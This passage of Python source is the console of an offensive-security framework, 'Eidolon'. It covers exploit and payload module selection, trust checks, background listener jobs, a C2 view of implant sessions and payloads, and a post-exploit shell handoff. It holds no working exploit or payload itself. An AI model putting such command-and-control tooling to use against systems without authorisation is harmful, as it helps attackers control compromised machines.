        print(f"  {C.PURPLE}│{C.RESET} file: {getattr(m,'__eidolon_path__','?')}")
        print(f"  {C.PURPLE}│{C.RESET} trust: {C.GREEN}verified{C.RESET} (sha256: {(entry.get('sha256') or '?')[:16]}…)")
        print(f"  {C.PURPLE}╰────────────────────────────────────╯")
        opts = getattr(m, "OPTIONS", {})
        if opts:
            rows = [[k, str(v.get("value", "")), "yes" if v.get("required") else "no", v.get("kind", ""), v.get("desc", "")] for k, v in opts.items()]
            print_table(["Name", "Default", "Req", "Kind", "Desc"], rows, title="OPTIONS")
        print()

    def do_use(self, arg):
        if arg.strip() and not self._resolve(arg):
            if self._session_interact(arg.strip()) == "handled":
                return
        name = self._resolve(arg)
        if not name:
            raw = arg.strip()
            if raw in self._untrusted:
                status = self._untrusted[raw]
                return err(f"module '{raw}' is {status}. run {C.PINK}trust {raw}{C.RESET} first.")
            return err(f"module '{arg.strip()}' not found.")
        if name not in self.modules:
            status = self._untrusted.get(name, "untrusted")
            return err(f"module '{name}' is {status}. run {C.PINK}trust {name}{C.RESET} first.")
        mod = self.modules[name]
        self.current = mod
        self.current_name = name
        self.current_options = copy.deepcopy(getattr(mod, "OPTIONS", {}))
        ok(f"selected: {c(name, C.PINK)}")
        self.do_options("")

    def _session_interact(self, ref):
        """Resolve a wraith SESSION reference and hand the console to the
        listener module that owns it — sess.interact(EIDOLON_SHELL). The
        framework ONLY resolves and steps aside: the inner shell, its prompt,
        its commands and its tab completion are entirely module business.
        Returns "handled" when the console was handed over/errored.
        """
        try:
            from eidolon.wraith import sessions as wsessions
        except ImportError:
            return None
        try:
            sess = wsessions.default_registry().find(ref)
        except ValueError as e:
            err(str(e))
            return "handled"
        if sess is None:
            return None
        handler = getattr(sess, "interact", None)
        if not callable(handler):
            err(f"session {sess.sid[:8]} offers no interactive shell — "
                f"its listener module attached no interact() handler")
            return "handled"
        ok(f"entering session {C.PINK}{sess.sid[:8]}{C.RESET} — {sess.label}")
        try:
            handler(self)
        except Exception as e:
            err(f"session handoff failed: {e}")
        return "handled"

    def do_back(self, arg):
        if self._subshell_active: self.exit_subshell()
        if not self.current: return warn("no module selected.")
        spectral(f"left {self.current_name}")
        self.current = self.current_name = self.current_options = None

    def do_options(self, arg):
        if not self.current: return err("no module selected.")
        opts = self.current_options or {}
        if not opts: return info("no options.")
        rows = [[k, str(v.get("value", "")), "yes" if v.get("required") else "no", v.get("kind", ""), v.get("desc", "")] for k, v in opts.items()]
        print_table(["Name", "Value", "Req", "Kind", "Desc"], rows, title=f"OPTIONS · {self.current_name}")

    def do_show(self, arg):
        a = arg.strip().lower()
        if a in ("options", "opt", "o", ""): self.do_options("")
        elif a in ("modules", "m"): self.do_modules("")
        else: err("usage: show [options|modules]")

    @staticmethod
    def _cast(value, reference):
        s = value.strip()
        if isinstance(reference, bool): return s.lower() in ("1", "true", "yes", "on", "y")
        if isinstance(reference, int) and not isinstance(reference, bool):
            try: return int(s)
            except ValueError: return s
        if isinstance(reference, float):
            try: return float(s)
            except ValueError: return s
        return s

    def do_set(self, arg):
        if not self.current: return err("no module selected.")
        try: parts = shlex.split(arg)
        except ValueError as e: return err(f"parse error: {e}")
        if len(parts) < 2: return err("usage: set <name> <value>")
        key, val = parts[0], " ".join(parts[1:])
        if key not in self.current_options: return err(f"unknown option: {key}")
        old = self.current_options[key].get("value")
        self.current_options[key]["value"] = self._cast(val, old)
        spec = self.current_options[key]
        if spec.get("kind") == "payload" and str(val).strip():
            try:
                from eidolon.wraith import store
                _, manifest = store.resolve_payload(str(spec["value"]), kinds=spec.get("types") or None)
            except ImportError as e:
                self.current_options[key]["value"] = old
                return err(f"payload subsystem unavailable: {e}")
            except ValueError as e:
                self.current_options[key]["value"] = old
                return err(f"payload rejected — {e}")
            ok(f"{C.CYAN}{key}{C.RESET} → {spec['value']!r}  ({store.summary(manifest)})")
            return
        ok(f"{C.CYAN}{key}{C.RESET} → {self.current_options[key]['value']!r}")

    def do_unset(self, arg):
        key = arg.strip()
        if not self.current or key not in (self.current_options or {}): return err(f"unknown: {key}")
        default = getattr(self.current, "OPTIONS", {}).get(key, {}).get("value", "")
        self.current_options[key]["value"] = copy.deepcopy(default)
        spectral(f"{key} reset to default")

    def do_run(self, arg):
        if not self.current: return err("no module selected.")
        # Re-verify trust right before exec (paranoia)
        name = self.current_name
        fp = getattr(self.current, "__eidolon_path__", None)
        if fp and os.path.exists(fp):
            trusted, status = self.trust_mgr.is_trusted(name, fp)
            if not trusted:
                return err(f"module '{name}' is {status} — refusing to run. run 'trust {name}'.")

        missing = [k for k, v in (self.current_options or {}).items() if v.get("required") and v.get("value") in (None, "", [], {})]
        if missing: return err(f"missing required: {', '.join(missing)}")

        values = {k: v.get("value") for k, v in self.current_options.items()}
        values, payload_error = self._resolve_payload_values(values)
        if payload_error:
            return err(f"payload option rejected — {payload_error}")
        mtype = _module_type(self.current)
        if mtype == MODULE_TYPE_PAYLOAD:
            try:
                from eidolon.wraith import store as wstore
                before = set(wstore.list_payloads())
            except ImportError:
                before = None
        if "--bg" in (arg or "").split() or mtype == MODULE_TYPE_LISTENER:
            job = self.jobs.submit(self.current, self.current_name, values)
            ok(f"job #{job.jid} started — {self.current_name} (background)")
            info(f"manage: {C.CYAN}jobs{C.RESET} · stop with {C.CYAN}kill {job.jid}{C.RESET}")
            return
        hr(C.PURPLE)
        print(f"  {C.PINK}◈{C.RESET} {C.BOLD}EXECUTING OPERATION{C.RESET}")
        print(f"  {C.SHADOW}├─{C.RESET} module : {C.PINK}{self.current_name}{C.RESET}")
        hr(C.PURPLE)
        try: invoke(self.current.run, values)
        except KeyboardInterrupt: warn("interrupted.")
        except Exception as e:
            err(f"module error: {e}")
            if os.environ.get("EIDOLON_DEBUG"): traceback.print_exc()
        if not self._subshell_active:
            hr(C.PURPLE); ok("operation complete")
        if mtype == MODULE_TYPE_PAYLOAD and before is not None:
            try:
                from eidolon.wraith import store as wstore
                for n, manifest in wstore.list_payloads().items():
                    if n in before:
                        continue
                    info(f"registered payload: {C.CYAN}{n}{C.RESET} — {wstore.summary(manifest)}")
            except ImportError:
                pass

    def do_gen(self, arg):
        """gen <payload module> — select a payload BUILDER; params via set, build via run"""
        name = self._resolve(arg)
        if not name or name not in self.modules:
            return err(f"module '{arg.strip()}' not found or not loaded — see: {C.CYAN}modules{C.RESET}")
        mod = self.modules[name]
        mtype = _module_type(mod)
        if mtype == MODULE_TYPE_LISTENER:
            return err(f"'{name}' is a listener — listeners are free modules, the framework "
                       f"normalizes nothing: {C.CYAN}use {name}{C.RESET} → {C.CYAN}set port …{C.RESET} → "
                       f"{C.CYAN}run{C.RESET} (auto-backgrounds as a job)")
        if mtype != MODULE_TYPE_PAYLOAD:
            return err(f"'{name}' is a '{mtype}' module — gen selects payload (builder) modules")
        self.do_use(name)
        print(f"  {C.PINK}\u25c8{C.RESET} {C.BOLD}GEN MODE{C.RESET} — parameters via {C.CYAN}set <key> <value>{C.RESET} · "
              f"build + register: {C.CYAN}run{C.RESET}")
        info(f"payloads land in the typed store — list with: {C.CYAN}c2 payloads{C.RESET}")

    def do_jobs(self, arg):
        """jobs — list background jobs (listeners, long-running modules)"""
        jobs = self.jobs.all()
        if not jobs:
            return info("no background jobs — listener modules started with gen appear here")
        marks = {"running": (C.GREEN, "●"), "done": (C.GRAY, "○"), "exited": (C.GRAY, "○"),
                 "stopped": (C.GRAY, "○"), "failed": (C.RED, "✗")}
        rows = []
        for j in jobs:
            color, mark = marks.get(j.status, (C.YELLOW, "○"))
            rows.append([f"{C.PINK}#{j.jid}{C.RESET}", f"{C.CYAN}{j.name}{C.RESET}",
                         f"{color}{mark} {j.status}{C.RESET}", _uptime_str(j.started),
                         (j.error or "-")[:40]])
        print_table(["ID", "Module", "Status", "Uptime", "Error"], rows, title="BACKGROUND JOBS")
        info(f"stop one with: {C.PINK}kill <id>{C.RESET}")

    def do_kill(self, arg):
        """kill <id> — stop a background job (calls the module's stop())"""
        token = arg.strip().lstrip("#")
        if not token.isdigit():
            return err("usage: kill <job id> — see: jobs")
        okk, msg = self.jobs.kill(int(token))
        (ok if okk else err)(msg)

    def do_shell(self, arg):
        """shell — interactive post-exploit takeover (module's shell() handler)"""
        if self._subshell_active:
            return err("already inside a shell — exit it first")
        if not self.current:
            return err("no module selected — use <post-exploit module> first")
        handler = getattr(self.current, "shell", None)
        mtype = _module_type(self.current)
        if not callable(handler):
            if mtype == MODULE_TYPE_POST:
                return err(f"{self.current_name} is post-exploit but declares no shell() "
                           f"— add `def shell(opts)` that takes the channel from its listener")
            if mtype == MODULE_TYPE_EXPLOIT:
                return err(f"{self.current_name} offers no shell() — post-exploit modules "
                           f"own the interactive takeover (or add one yourself)")
            return err(f"{self.current_name} ({mtype}) offers no shell()")
        name = self.current_name
        fp = getattr(self.current, "__eidolon_path__", None)
        if fp and os.path.exists(fp):
            trusted, status = self.trust_mgr.is_trusted(name, fp)
            if not trusted:
                return err(f"module '{name}' is {status} — refusing. run 'trust {name}'.")
        values = {k: v.get("value") for k, v in (self.current_options or {}).items()}
        values, payload_error = self._resolve_payload_values(values)
        if payload_error:
            return err(f"payload option rejected — {payload_error}")
        try:
            invoke(handler, values)
        except KeyboardInterrupt:
            warn("interrupted.")
        except Exception as e:
            err(f"shell handler error: {e}")
            if os.environ.get("EIDOLON_DEBUG"):
                traceback.print_exc()

    def _payload_specs(self, options):
        """Option specs declared as "kind": "payload" — the dedicated payload
        field. These resolve against the typed wraith store: `set KEY <ref>`
        validates live, run() receives a manifest dict with a "path" key.
        """
        return {k: v for k, v in (options or {}).items() if v.get("kind") == "payload"}

    def _resolve_payload_values(self, values, module=None):
        """Swap every payload-kind option's raw ref (store name or path) for
        its manifest dict (+ path). Returns (values, error_or_None).
        """
        specs = self._payload_specs(getattr(module or self.current, "OPTIONS", {}))
        if not specs:
            return values, None
        try:
            from eidolon.wraith import store
        except ImportError as e:
            return values, f"payload subsystem unavailable: {e}"
        for key, meta in specs.items():
            ref = str(values.get(key) or "").strip()
            if not ref:
                continue
            try:
                path, manifest = store.resolve_payload(ref, kinds=meta.get("types") or None)
            except ValueError as e:
                return values, f"{key}: {e}"
            values[key] = dict(manifest, path=path)
        return values, None

    @property
    def wraith_listener(self):
        """The running wraith Listener (or None). Payload-builder modules
        read the operator profile from here: EIDOLON_SHELL.wraith_listener
        gives .url / .token / .tags of the listener that is up right now.
        Listener modules assign themselves here at start().
        """
        return getattr(self, "_wraith_listener", None)

    @wraith_listener.setter
    def wraith_listener(self, value):
        """Listener modules publish their operating profile: any object (or
        simple namespace) that carries .url / .token / .tags."""
        self._wraith_listener = value

    # ── WRAITH C2 subsystem ───────────────────────────────────────────────────────────
    def _c2_on_event(self, event):
        kind, sess = event
        lock = getattr(self, "_wraith_lock", None)
        with (lock or threading.RLock()):
            if kind == "up":
                line = (f"  {C.GREEN}⬢{C.RESET} {C.BOLD}payload connected{C.RESET} "
                        f"{C.PINK}{sess.sid[:8]}{C.RESET} {C.GRAY}·{C.RESET} "
                        f"{sess.user}@{sess.host} {C.GRAY}·{C.RESET} "
                        f"{sess.implant}/{sess.os}-{sess.arch} {C.GRAY}·{C.RESET} {sess.addr}")
            else:
                line = (f"  {C.YELLOW}◌{C.RESET} {C.GRAY}session lost{C.RESET} "
                        f"{C.PINK}{sess.sid[:8]}{C.RESET} {C.GRAY}·{C.RESET} {sess.label}")
            try:
                print(f"\r{line}{C.RESET}")
                if not self._subshell_active:
                    print(self.prompt, end="", flush=True)
            except Exception:
                pass

    def do_c2(self, arg):
        """c2 <status|sessions|payloads> — read-only view over the C2 kernel
        (the framework ships no listener: listener modules are started with gen)"""
        try:
            from eidolon.wraith import store
            from eidolon.wraith import sessions as wsessions
        except ImportError as e:
            return err(f"c2 kernel unavailable: {e}")

        parts = shlex.split(arg or "")
        sub = parts[0] if parts else ""

        if not sub or sub == "help":
            print(f"\n  {C.PURPLE}╭─ WRAITH C2 ──────────────────────────╮{C.RESET}")
            print(f"  {C.PURPLE}│{C.RESET}  {C.CYAN}c2 status{C.RESET}                 — listener profile + session counts")
            print(f"  {C.PURPLE}│{C.RESET}  {C.CYAN}c2 sessions{C.RESET}               — live session table")
            print(f"  {C.PURPLE}│{C.RESET}  {C.CYAN}c2 payloads{C.RESET}               — list the typed payload store")
            print(f"  {C.PURPLE}│{C.RESET}  {C.GRAY}listeners + builders are MODULES (module types 'listener' / 'payload'):{C.RESET}")
            print(f"  {C.PURPLE}│{C.RESET}  {C.GRAY}the framework ships none — write or install one, then:{C.RESET}")
            print(f"  {C.PURPLE}│{C.RESET}  {C.CYAN}use <listener>{C.RESET}{C.GRAY} → {C.CYAN}set …{C.RESET}{C.GRAY} → {C.CYAN}run{C.RESET}{C.GRAY} (auto-backgrounds as a job){C.RESET}")
            print(f"  {C.PURPLE}│{C.RESET}  {C.CYAN}gen <payload module>{C.RESET}{C.GRAY} → select builder · {C.CYAN}set{C.RESET}{C.GRAY} params · {C.CYAN}run{C.RESET}{C.GRAY} builds+registers{C.RESET}")
            print(f"  {C.PURPLE}│{C.RESET}  {C.GRAY}builders read the listener profile from {C.CYAN}EIDOLON_SHELL.wraith_listener{C.RESET}")
            print(f"  {C.PURPLE}│{C.RESET}  {C.GRAY}no wire contract: capabilities (shell, screenshot, …) are agreements{C.RESET}")
            print(f"  {C.PURPLE}│{C.RESET}  {C.GRAY}between YOUR listener and YOUR payload — the kernel never mediates{C.RESET}")
            print(f"  {C.PURPLE}╰────────────────────────────{C.RESET}\n")
            return

        if sub == "status":
            reg = wsessions.default_registry()
            counts = reg.counts()
            lsn = self.wraith_listener
            print(f"\n  {C.PURPLE}╭─ WRAITH STATUS ──────────────────────╮{C.RESET}")
            if lsn is not None:
                tags = " ".join(getattr(lsn, "tags", ()) or ()) or "-"
                print(f"  {C.PURPLE}│{C.RESET}  listener : {C.GREEN}● online{C.RESET}  {getattr(lsn, 'url', '?')}")
                print(f"  {C.PURPLE}│{C.RESET}  tags     : {C.CYAN}{tags}{C.RESET} {C.GRAY}(free metadata — payloads embed whatever they like){C.RESET}")
            else:
                print(f"  {C.PURPLE}│{C.RESET}  listener : {C.GRAY}○ none — use <listener module> · set … · run (auto-job){C.RESET}")
            active_jobs = len(self.jobs.active())
            print(f"  {C.PURPLE}│{C.RESET}  jobs     : {C.CYAN}{active_jobs}{C.RESET} running · see {C.CYAN}jobs{C.RESET}")
            print(f"  {C.PURPLE}│{C.RESET}  sessions : {C.GREEN}{counts['active']}{C.RESET} active · {C.YELLOW}{counts['lost']}{C.RESET} lost · {counts['total']} total")
            print(f"  {C.PURPLE}│{C.RESET}  store    : {C.CYAN}{store.STORE_DIR}{C.RESET}")
            print(f"  {C.PURPLE}╰───────────────────────────────────╰\n{C.RESET}")
            return

        if sub == "sessions":
            reg = wsessions.default_registry()
            rows = []
            for s in reg.all():
                mark = f"{C.GREEN}●{C.RESET}" if s.status == "active" else f"{C.GRAY}○{C.RESET}"
                rows.append([mark, f"{C.PINK}{s.sid[:8]}{C.RESET}", f"{s.user}@{s.host}",
                             f"{s.implant}/{s.os}-{s.arch}", s.addr,
                             _uptime_str(s.connected_at)])
            if not rows:
                return info("no sessions yet — gen a listener module, then deliver an artifact.")
            print_table(["", "SID", "Identity", "Implant", "Address", "Uptime"], rows,
                        title="WRAITH SESSIONS")
            info(f"interact: {C.CYAN}use <sid-prefix>{C.RESET} — full handoff to the "
                 f"listener module's own shell (tab completion included)")
            return

        if sub == "payloads":
            payloads = store.list_payloads()
            if not payloads:
                return info("payload store empty — a payload-type module fills it via store.register_payload()")
            if len(parts) > 1:
                ref = " ".join(parts[1:])
                man = payloads.get(ref)
                if man is None:
                    return err(f"no payload named {ref!r} — try: c2 payloads")
                print(f"\n  {C.PURPLE}╭─ PAYLOAD {C.CYAN}{C.BOLD}{ref}{C.RESET}{C.PURPLE} " + "─" * 14 + f"╮{C.RESET}")
                print(f"  {C.PURPLE}│{C.RESET} summary  : {store.summary(man)}")
                print(f"  {C.PURPLE}│{C.RESET} sha256   : {man.get('sha256') or '?'}")
                print(f"  {C.PURPLE}│{C.RESET} artifact : {C.CYAN}{store.artifact_path(man)}{C.RESET}")
                if man.get("note"):
                    print(f"  {C.PURPLE}│{C.RESET} note     : {man['note']}")
                cfg = man.get("config") or {}
                if cfg:
                    print(f"  {C.PURPLE}│{C.RESET} config   : {C.CYAN}build-time configuration (the builder's set page){C.RESET}")
                    for k in sorted(cfg):
                        v = "" if cfg[k] is None else str(cfg[k])
                        print(f"  {C.PURPLE}│{C.RESET}   {C.PINK}{k}{C.RESET} = {v}")
                else:
                    print(f"  {C.PURPLE}│{C.RESET} config   : {C.GRAY}none recorded{C.RESET}")
                print(f"  {C.PURPLE}╰" + "─" * 34 + f"╯{C.RESET}\n")
                return
            rows = []
            for p in payloads.values():
                rows.append([C.PINK + p["name"] + C.RESET, p.get("type", "?"),
                             p.get("protocol") or "-",
                             p.get("backend") or "-",
                             (f"{p['os']}/{p['arch']}" if p.get("os") else "-"),
                             (p.get("sha256") or "")[:12]])
            print_table(["Name", "Type", "Protocol", "Backend", "OS/Arch", "SHA256"], rows,
                        title=f"PAYLOAD STORE · {store.STORE_DIR}")
            info(f"detail: {C.CYAN}c2 payloads <name>{C.RESET} — full manifest incl. the build config")
            return

        return err(f"unknown c2 subcommand: {sub!r} — try {C.CYAN}c2{C.RESET} for help")

    def do_sessions(self, arg):
        arg = arg.strip()
        if arg:
            try: sid = int(arg.lstrip("#"))
            except ValueError: return err(f"invalid id: {arg!r}")
            s = self.db.get_session(sid)
            if not s: return err(f"session #{sid} not found")
            print(f"\n  {C.PURPLE}╭─ SESSION #{sid} ─────────────────────╮{C.RESET}")
            print(f"  {C.PURPLE}│{C.RESET} module : {s['module']}")
            print(f"  {C.PURPLE}│{C.RESET} target : {s['target']}")
            print(f"  {C.PURPLE}│{C.RESET} status : {s['status']}")
            print(f"  {C.PURPLE}╰──────────────────────────────────────╯\n")
            return

        sessions = self.db.get_sessions()
        if not sessions: return info("no sessions recorded.")
        rows = []
        for s in sessions:
            status = f"{C.GREEN}● active{C.RESET}" if s["status"] == "active" else f"{C.GRAY}○ closed{C.RESET}"
            end = s.get("closed_at") or time.time()
            dur = _fmt_duration(end - s.get("started_at", end))
            rows.append([f"{C.PINK}#{s['id']}{C.RESET}", s["module"], s.get("target","-"), status, dur])
        print_table(["ID", "Module", "Target", "Status", "Duration"], rows, title="SESSIONS")

    def do_setg(self, arg):
        try: parts = shlex.split(arg)
        except ValueError as e: return err(f"parse error: {e}")
        if len(parts) < 2: return err("usage: setg <name> <value>")
        key, val = parts[0], " ".join(parts[1:])
        self.globals[key] = val
        self.db.set_global(key, val)
        ok(f"global {C.CYAN}{key}{C.RESET} → {val!r} (saved to DB)")

    def do_globals(self, arg):
        if not self.globals: return info("no globals set.")
        rows = [[k, v] for k, v in self.globals.items()]
        print_table(["Name", "Value"], rows, title="GLOBAL VARIABLES")

    # ═════════════════════════════════════════════════════════
    # TAB COMPLETION
    # ═════════════════════════════════════════════════════════
    def complete_new_module(self, text, line, begidx, endidx):
        parts = line.split()
        n_before = len(parts) - (0 if line.endswith(" ") else 1) - 1
        if n_before >= 2:
            names = ("exploit", "listener", "payload", "post-exploit", "auxiliary",
                     "generic", "--fa")
            return [w for w in names if w.startswith(text)]
        in_first = (len(parts) == 1) or (len(parts) == 2 and not line.endswith(" "))
        if in_first:
            # completing the module name: existing category dirs under MODULES_DIR
            prefix   = text
            sub_path = ""
            if "/" in prefix:
                sub_path, _, sub = prefix.rpartition("/")
                sub_path = sub_path.strip("/")
                sub = text.rpartition("/")[2]
            else:
                sub = prefix
            base_dir = os.path.join(MODULES_DIR, sub_path) if sub_path else MODULES_DIR
            try:
                entries = os.listdir(base_dir)
            except OSError:
                return []
            results = []
            for e in sorted(entries):
                if e.startswith((".", "_", "@")):
                    continue
                full = os.path.join(base_dir, e)
                if os.path.isdir(full) and e.startswith(sub):
                    results.append((sub_path + "/" if sub_path else "") + e + "/")
            return results
        # completing the optional target dir: filesystem directories
        clean_text = text.strip("'\"")
        expanded   = os.path.expanduser(clean_text) if clean_text else ""
        matches    = glob.glob(expanded + "*") if expanded else []
        results    = []
        for match in matches:
            if not os.path.isdir(match):
                continue
            display = match
            if clean_text.startswith("~") and not display.startswith("~"):
                home = os.path.expanduser("~")
                if display.startswith(home):
                    display = "~" + display[len(home):]
            if not display.endswith("/"):
                display += "/"
            results.append(display)
        return results

    def complete_add_module(self, text, line, begidx, endidx):
        clean_text = text.strip("'\"")
        expanded_text = os.path.expanduser(clean_text)
        matches = glob.glob(expanded_text + '*')
        results = []
        for match in matches:
            basename = os.path.basename(match.rstrip('/'))
            if basename == '__pycache__' or basename.startswith('_'): continue
            is_dir = os.path.isdir(match)
            if is_dir or match.endswith('.py'):
                display_match = match
                if clean_text.startswith('~'):
                    home = os.path.expanduser('~')
                    if display_match.startswith(home): display_match = '~' + display_match[len(home):]
                if is_dir and not display_match.endswith('/'): display_match += '/'
                if text.startswith("'") and not display_match.startswith("'"): display_match = "'" + display_match + "'"
                elif text.startswith('"') and not display_match.startswith('"'): display_match = '"' + display_match + '"'
                results.append(display_match)
        return results
    complete_install_local = complete_add_module

    def complete_remove(self, text, *_):
        known = list(self.modules.keys()) + list(self._untrusted.keys())
        return [m for m in known if m.startswith(text)]
    def complete_trust(self, text, *_):
        if text == "--": return ["--all"]
        return [m for m in self._untrusted if m.startswith(text)]

    def complete_untrust(self, text, *_):
        entries = self.trust_mgr.list_all()
        return [m for m in entries if m.startswith(text)]

    def complete_trusted(self, text, *_):
        return [x for x in ["--all"] if x.startswith(text)]

    def complete_repo(self, text, line, begidx, endidx):
        parts = line.split()
        if line.endswith(' '): parts.append('')
        if len(parts) == 2:
            cmds = ["list", "add", "remove", "enable", "disable", "priority",
                    "sync", "search", "list-modules", "stats", "check",
                    "install", "upgrade", "update-all", "pack", "source", "info"]
            return [c for c in cmds if c.startswith(text)]
        elif len(parts) == 3:
            if parts[1] in ('install', 'info', 'upgrade', 'source', 'search'):
                try: return [m for m in self.repo_mgr.get_all_modules() if m.startswith(text)]
                except Exception: return []
            elif parts[1] in ('enable', 'disable', 'remove', 'priority'):
                return [r['url'] for r in self.repo_mgr.remotes if r['url'].startswith(text)]
        return []

    def complete_use(self, text, *_):
        hits = [m for m in self.modules if m.startswith(text)]
        try:
            from eidolon.wraith import sessions as wsessions
            hits += [s.sid for s in wsessions.default_registry().active()
                     if s.sid.startswith(text)]
        except Exception:
            pass
        return hits

    def complete_gen(self, text, *_):
        return [m for m in self.modules
                if m.startswith(text)
                and _module_type(self.modules[m]) in (MODULE_TYPE_PAYLOAD, MODULE_TYPE_LISTENER)]
    def complete_kill(self, text, *_): return [str(j.jid) for j in self.jobs.all() if str(j.jid).startswith(text)]
    def complete_c2(self, text, line, begidx, endidx):
        parts = line.split()
        if len(parts) <= 1:
            return [x for x in ("status", "sessions", "payloads") if x.startswith(text)]
        return []
    def complete_show(self, text, line, begidx, endidx):
        if len(line.split()) <= 1:
            return [x for x in ("options", "modules") if x.startswith(text)]
        return []
    def complete_info(self, text, *_):
        known = list(self.modules.keys()) + list(self._untrusted.keys())
        return [m for m in known if m.startswith(text)]
    def complete_set(self, text, *_): return [k for k in (self.current_options or {}) if k.startswith(text)]
    def complete_unset(self, text, *_): return self.complete_set(text, *_)
    def complete_help(self, text, *_):
        cmds = ["help","banner","clear","reload","exit","modules","ls","search","info","use","back",
                "options","set","unset","run","sessions","new_module","add_module","install_local","remove",
                "setg","globals","status","repo","c2",
                "trust","untrust","trusted","verify"]
        return [x for x in cmds if x.startswith(text)]

    def completedefault(self, text, line, begidx, endidx):
        if self._subshell_active and callable(self._subshell_completer):
            try: return self._subshell_completer(text, line, begidx, endidx)
            except Exception: return []
        return []


def main():
    if "--no-banner" not in sys.argv: print_banner(animate=True)
    else: print(f"  {C.PINK}Eidolon{C.RESET} {CODENAME} v{__version__}\n")

    shell = Eidolon()
    try: shell.cmdloop()
    except KeyboardInterrupt: print(); shell.do_exit("")
    except EOFError: shell.do_exit("")


if __name__ == "__main__":
    main()